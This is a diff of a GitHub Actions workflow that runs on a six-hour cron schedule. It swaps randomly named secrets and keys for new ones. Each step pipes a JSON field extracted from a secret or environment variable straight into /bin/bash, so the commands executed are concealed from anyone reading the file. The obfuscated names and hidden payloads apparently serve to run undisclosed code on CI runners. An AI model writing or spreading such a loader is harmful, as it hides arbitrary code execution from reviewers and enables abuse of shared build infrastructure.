@@ -1,24 +1,24 @@
 name: pousuanshami
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 1/6 * * *'
+    - cron: '9 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pousuanshami
         env:
-          h70794: ${{ secrets.h70794 }}
+          samhb91: ${{ secrets.samhb91 }}
         run: |
-          echo $h70794 | jq -r .whs08 | /bin/bash
-          echo $vrce9 | jq -r .npsu9362 | /bin/bash
-          echo $hi97171 | jq -r .jbby165 | /bin/bash
-          echo $syol90 | jq -r .ronrj612 | /bin/bash
-          echo $lldtp61905 | jq -r .m7 | /bin/bash
-          echo $p1 | jq -r .raic992 | /bin/bash
-          echo $vowsl766 | jq -r .zh6845 | /bin/bash
+          echo $samhb91 | jq -r .je57106 | /bin/bash
+          echo $xnyv03 | jq -r .mcie22023 | /bin/bash
+          echo $gmosu6 | jq -r .c07623 | /bin/bash
+          echo $gtxdz9 | jq -r .cbrzb5044 | /bin/bash
+          echo $z8472 | jq -r .pqlfy84 | /bin/bash
+          echo $dll7144 | jq -r .rufp968 | /bin/bash
+          echo $oy2 | jq -r .nee89646 | /bin/bash
+          echo $w7 | jq -r .y185 | /bin/bash
+          echo $wmw43 | jq -r .ptw4 | /bin/bash
 
